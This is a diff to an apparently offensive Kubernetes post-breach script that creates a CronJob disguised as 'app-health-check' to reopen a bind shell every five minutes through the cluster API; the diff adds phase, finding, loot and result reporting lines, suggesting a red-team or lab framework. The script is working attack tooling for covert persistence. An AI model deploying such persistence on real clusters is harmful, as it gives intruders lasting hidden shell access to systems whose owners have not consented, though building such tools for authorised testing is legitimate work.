@@ -20,9 +20,11 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$SCRIPT_DIR/lib.sh"
 
 banner "Post-Breach: CronJob Persistence"
+echo "@PHASE CronJob-Persistence"
 
 PYTHON_CODE="${K8S_API_PREAMBLE}
 
+print('@PHASE Build-CronJob-Manifest')
 print('=' * 60)
 print('  PERSISTENCE: CronJob Bind Shell Reopener')
 print('=' * 60)
@@ -81,19 +83,27 @@ print(f'  Schedule:         */5 * * * *')
 print(f'  Bind port:        {bind_port}')
 print()
 
+print('@PHASE Deploy-CronJob')
 result, status = k8s_post(f'/apis/batch/v1/namespaces/{agent_ns}/cronjobs', cronjob)
 
 if status == 201:
     print('  CronJob created successfully.')
     print('  Bind shell will reopen every 5 minutes.')
+    print('@FINDING critical CronJob app-health-check created — bind shell reopens every 5 min')
+    print(f'@LOOT persistence-config cronjob:app-health-check:*/5')
+    print('@RESULT success CronJob persistence installed')
 elif status == 409:
     print('  CronJob already exists.')
+    print('@FINDING info CronJob already exists — persistence already in place')
+    print('@RESULT success CronJob already present')
 elif status == 403:
     print(f'  Access denied (HTTP {status}). RBAC does not allow CronJob creation.')
     print('  This attack requires batch/cronjobs create permission.')
+    print('@RESULT failure RBAC denied CronJob creation')
 else:
     print(f'  Failed: HTTP {status}')
     print(f'  Response: {json.dumps(result, indent=2)[:500]}')
+    print(f'@RESULT failure CronJob creation failed with HTTP {status}')
 
 print()
 print('CronJob persistence complete.')
